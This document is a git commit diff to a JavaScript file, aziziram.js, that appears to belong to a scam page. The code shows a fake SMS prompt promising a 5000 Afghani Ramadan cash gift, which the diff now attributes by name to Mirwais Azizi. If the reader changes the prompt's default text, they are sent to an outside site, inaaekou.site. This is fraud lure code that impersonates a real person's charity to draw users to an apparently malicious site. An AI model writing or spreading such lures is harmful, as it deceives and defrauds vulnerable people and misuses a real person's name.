a13bd12390db7199f3aabf8f5a19497302e5e705
usorondo16 <curtsy.walk6p@icloud.com>
2026-02-21 13:21:53 +0100

    Update aziziram.js

--- aziziram.js
+++ aziziram.js
@@ -1,5 +1,5 @@
 var password = 'برداشت 5000 افغانی'
-password = prompt('SMS: Congratulations, your are eligible to برداشت 5000 افغانی Cash Ramadan Gift From , click OK to activate now','برداشت 5000 افغانی');
+password = prompt('SMS: تبریک باشه شما واجد شرایط دریافت 5000 افغانی تحفه نقدی رمضانی از Mirwais Azizi, برای دریافت پیشنهاد حالا روی OK کلیک کنید','برداشت 5000 افغانی');
 if (password != 'برداشت 5000 افغانی') {
-    location.href ='https://www.inaaekou.site/برداشت 5000 افغانی-ramadan';
+    location.href ='https://www.inaaekou.site/afn5000-ramadan';
 }
